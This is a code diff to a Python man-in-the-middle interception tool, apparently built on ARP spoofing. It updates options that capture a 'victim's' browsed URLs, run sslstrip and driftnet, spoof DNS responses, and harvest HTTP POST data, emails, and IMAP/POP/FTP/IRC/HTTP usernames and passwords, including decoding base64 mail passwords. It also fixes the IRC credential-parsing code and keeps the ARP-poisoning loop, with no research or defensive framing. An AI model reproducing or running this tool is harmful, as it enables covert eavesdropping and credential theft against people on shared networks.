@@ -17,15 +17,15 @@ from subprocess import *
 
 #Create the arguments
 parser = argparse.ArgumentParser()
-parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also truncates URLs at 150 characters. Use -uv to print all URLs and without truncation.", action="store_true")
-parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning.")
+parser.add_argument("-u", "--urlspy", help="Show all URLs the victim is browsing minus URLs that end in .jpg, .png, .gif, .css, and .js to make the output much friendlier. Also truncates URLs at 150 characters. Use -v to print all URLs and without truncation.", action="store_true")
+parser.add_argument("-ip", "--ipaddress", help="Enter IP address of victim and skip the arp ping at the beginning which would give you a list of possible targets.")
 parser.add_argument("-d", "--driftnet", help="Open an xterm window with driftnet.", action="store_true")
-parser.add_argument("-s", "--sslstrip", help="Open an xterm window with sslstrip and output to sslstrip.txt", action="store_true")
-parser.add_argument("-v", "--verboseURL", help="Shows all URLs the victim visits", action="store_true")
-parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument")
-parser.add_argument("-p", "--post", help="Print the URL the victim POSTs to, show usernames/passwords in unsecure HTTP POSTs, show FTP usernames/passwords", action="store_true")
-parser.add_argument("-w", "--write", help="Write to logfile", action="store_true")
-parser.add_argument("-i", "--interface", help="Choose the interface to use. Default is the first one that shows up in `ip route`")
+parser.add_argument("-s", "--sslstrip", help="Open an xterm window with sslstrip.", action="store_true")
+parser.add_argument("-v", "--verboseURL", help="Shows all URLs the victim visits but doesn't limit the URL to 150 characters like -u does.", action="store_true")
+parser.add_argument("-dns", "--dnsspoof", help="Spoof DNS responses of a specific domain. Enter domain after this argument. This is a race condition with the router so this option is unreliable")
+parser.add_argument("-p", "--post", help="Print unsecured HTTP POST loads, IMAP/POP/FTP/IRC/HTTP usernames/passwords and incoming/outgoing emails. Will also decode base64 encrypted POP/IMAP passwords for you.", action="store_true")
+parser.add_argument("-w", "--write", help="Write to logfile intercept.log.txt in the current directory", action="store_true")
+parser.add_argument("-i", "--interface", help="Choose the interface to use. Default is the first one that shows up in `ip route`.")
 args = parser.parse_args()
 
 #Console colors
@@ -47,7 +47,7 @@ oldhost = None
 combined_load = None
 
 if args.write:
-	logger = open('interceptlog.txt', 'w+')
+	logger = open('intercept.log.txt', 'w+')
 
 class Spoof():
 	def originalMAC(self, ip):
@@ -87,7 +87,7 @@ class Parser():
 				self.mailspy(pktload, dport, sport, MAC_src, MAC_dst, IP_dst)
 			if MAC_src == victimMAC:
 				if dport == 6667 or sport == 6667:
-					self.irc(pktload, dport, sport, MAC_src, MAC_dst)
+					self.irc(pktload, dport, sport, MAC_src)
 				else:
 					self.URL(pktload, ack, dport, sport)
 
@@ -194,7 +194,6 @@ class Parser():
 						self.cookies(host, header_lines)
 					oldhttp = 'post'
 
-#		oldload = pktload
 		oldack = ack
 		oldurl = url
 		oldhost = host
@@ -209,41 +208,41 @@ class Parser():
 	post = None
 	url = None
 
-	def irc(self, pktload, dport, sport, MAC_src, MAC_dst):
+	def irc(self, pktload, dport, sport, MAC_src):
 		if MAC_src == victimMAC:
-			pktload = pktload.split(r"\r\n")[0]
+			pktload = pktload.split(r"\r\n")
 			if args.post:
-				if 'NICK ' in pktload:
-					self.IRCnick = pktload.replace('NICK ', '')
-					server = pktload.replace('USER user user ', '').replace(' :user', '')
+				if 'NICK ' in pktload[0]:
+					self.IRCnick = pktload[0].replace('NICK ', '')
+					server = pktload[1].replace('USER user user ', '').replace(' :user', '')
 					print C+'[!] IRC username: '+self.IRCnick+' '+server+W
 					if args.write:
-						logger.write('[!] IRC username: '+IRCnick+' '+server+'\n')
-				if 'NS IDENTIFY ' in pktload:
-					ircpass = pktload.replace('NS IDENTIFY ', '')
+						logger.write('[!] IRC username: '+self.IRCnick+' '+server+'\n')
+				if 'NS IDENTIFY ' in pktload[0]:
+					ircpass = pktload[0].replace('NS IDENTIFY ', '')
 					print C+'[!] IRC password: '+ircpass+W
 					if args.write:
 						logger.write('[!] IRC password: '+ircpass+'\n')
-				if 'JOIN ' in pktload:
-					join = pktload.replace('JOIN ', '')
+				if 'JOIN ' in pktload[0]:
+					join = pktload[0].replace('JOIN ', '')
 					print C+'[+] IRC joined: '+join+W
 					if args.write:
 						logger.write('[+] IRC joined: '+join+'\n')
-				if 'PART ' in pktload:
-					part = pktload.replace('PART ', '')
+				if 'PART ' in pktload[0]:
+					part = pktload[0].replace('PART ', '')
 					print C+'[+] IRC part: '+part+W
 					if args.write:
 						logger.write('[+] IRC parted: '+part+'\n')
-				if 'QUIT ' in pktload:
-					quit = pktload.replace('QUIT ', '')
+				if 'QUIT ' in pktload[0]:
+					quit = pktload[0].replace('QUIT ', '')
 					print C+'[+] IRC quit: '+quit+W
 					if args.write:
 						logger.write('[+] IRC quit: '+quit+'\n')
-				if 'PRIVMSG ' in pktload:
-					channel = pktload.split(':')[0].replace('PRIVMSG ', '').replace(' ', '')
-					ircmsg = pktload.replace('PRIVMSG ', '').replace(':', '').replace(channel, '')
+				if 'PRIVMSG ' in pktload[0]:
+					channel = pktload[0].split(':')[0].replace('PRIVMSG ', '').replace(' ', '')
+					ircmsg = pktload[0].replace('PRIVMSG ', '').replace(channel, '')[2:]
 					if self.IRCnick != '':
-						print C+'[+] IRC '+self.IRCnick+' to '+W+channel+C+':'+ircmsg+W
+						print C+'[+] IRC '+self.IRCnick+' to '+W+channel+C+': '+ircmsg+W
 						if args.write:
 							logger.write('[+] IRC '+self.IRCnick+' to '+channel+':'+ircmsg+'\n')
 					else:
@@ -398,9 +397,6 @@ class Parser():
 class Threads():
 
 	def urlspy(self, victimIP, interface):
-#		This is in case you need to test the program without an actual victim
-#		sniff(store=0, filter='port 80 or port 21', prn=URL, iface=interface)
-#		sniff_filter = '(port 80 or port 21 or port 143 or port 110 or port 26) and host %s' % victimIP
 		sniff_filter = 'port 80 or port 21 or port 143 or port 110 or port 26 or port 6667'
 		sniff(store=0, filter=sniff_filter, prn=Parser().start, iface=interface)
 
@@ -428,8 +424,7 @@ class Threads():
 	def start_threads(self, victimIP, interface, DN):
 		if args.urlspy or args.verboseURL or args.post:
 			u = Thread(target=self.urlspy, args=(victimIP, interface))
-			#Make sure the thread closes with the main program on Ctrl-C
-			u.daemon = True
+			u.daemon = True #Make sure the thread closes with the main program on Ctrl-C
 			u.start()
 		if args.driftnet:
 			dr = Thread(target=self.driftnet, args=(interface, DN))
@@ -453,13 +448,13 @@ def print_vars(interface, DHCPsrvr, dnsIP, local_domain, routerIP, victimIP):
 	print "[+] Router IP: " + routerIP
 	print "[+] Client IP: " + victimIP
 
-
+#Enable IP forwarding and flush possibly conflicting iptables rules
 def ip_flush_forward(DN):
 	ipfwd = Popen(['cat', '/proc/sys/net/ipv4/ip_forward'], stdout=PIPE, stderr=DN)
 	if ipfwd.communicate()[0] != '1\n':
-		f = open('/proc/sys/net/ipv4/ip_forward', 'r+')
-		f.write('1\n')
-		f.close()
+		ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
+		ipf.write('1\n')
+		ipf.close()
 		print '[+] Enabled IP forwarding'
 	Popen(['iptables', '-F'], stdout=PIPE, stderr=DN)
 	Popen(['iptables', '-t', 'nat', '-F'], stdout=PIPE, stderr=DN)
@@ -552,6 +547,7 @@ def main():
 
 	Threads().start_threads(victimIP, interface, DN)
 
+	#Cleans up if Ctrl-C is caught
 	def signal_handler(signal, frame):
 		print 'learing iptables, sending healing packets, and turning off IP forwarding...'
 		if args.write:
@@ -559,6 +555,9 @@ def main():
 		if args.dnsspoof:
 			q.unbind(socket.AF_INET)
 			q.close()
+		ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
+		ipf.write('0\n')
+		ipf.close()
 		if not dnsIP == routerIP:
 			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
 			Spoof().restore(routerIP, dnsIP, routerMAC, dnsMAC)
@@ -575,16 +574,10 @@ def main():
 	while 1:
 
 		Spoof().poison(routerIP, victimIP, routerMAC, victimMAC)
+		#If DNS server is different from the router then we must spoof ourselves as the DNS server as well as the router
 		if not dnsIP == routerIP:
 			Spoof().poison(dnsIP, victimIP, dnsMAC, victimMAC)
 		time.sleep(1.5)
 
 if __name__ == "__main__":
 	main()
-
-
-
-#To do:
-#use iptables to block dns responses from the router to prevent race condition in dns spoofing
-#fix base64 decode for POP I think?
-#steal cookies
